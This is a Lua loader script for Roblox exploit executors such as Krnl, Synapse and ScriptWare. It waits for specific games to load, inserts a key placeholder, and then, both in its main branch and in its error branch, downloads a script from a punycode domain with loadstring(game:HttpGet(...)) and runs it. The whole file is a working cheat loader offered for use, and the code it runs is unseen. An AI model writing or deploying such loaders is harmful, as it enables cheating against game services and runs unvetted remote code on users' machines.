
local success,err = pcall(function()
    repeat wait(0.25) until game:IsLoaded()
    repeat wait(0.25) until game.Players.LocalPlayer
    if (game.PlaceId == 3978370137 or game.PlaceId == 7465136166) and not game.ReplicatedStorage:FindFirstChild("Matchinfo") then
        repeat wait(0.25) until game.Players.LocalPlayer:FindFirstChild("Loaded")
        repeat wait(0.25) until game.Players.LocalPlayer.Loaded.Value == true
    end
    getgenv().Key = "%s"
    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
end)
if (not success) then
    rconsoleprint("report this to x2bom : "..err)
    repeat wait(0.25) until game:IsLoaded()
    repeat wait(0.25) until game.Players.LocalPlayer
    if (game.PlaceId == 3978370137 or game.PlaceId == 7465136166) and not game.ReplicatedStorage:FindFirstChild("Matchinfo") then
        repeat wait(0.25) until game.Players.LocalPlayer:FindFirstChild("Loaded")
        repeat wait(0.25) until game.Players.LocalPlayer.Loaded.Value == true
    end
    getgenv().Key = "%s"
    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
end
